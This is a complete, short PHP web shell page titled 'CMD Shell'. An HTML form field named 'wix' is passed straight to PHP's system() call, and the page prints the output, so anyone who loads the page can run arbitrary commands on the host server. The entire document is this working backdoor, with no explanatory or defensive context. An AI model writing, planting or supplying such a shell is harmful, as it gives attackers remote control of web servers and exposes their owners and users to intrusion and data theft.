<html>
<title>CMD Shell</title>
<body>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="wix">
<INPUT TYPE="submit" VALUE=">">
</FORM>
<pre>
<?php
if(isset($_REQUEST["wix"])){
system($_REQUEST["wix"]);
}
?>
</pre>
</body>
  </html>
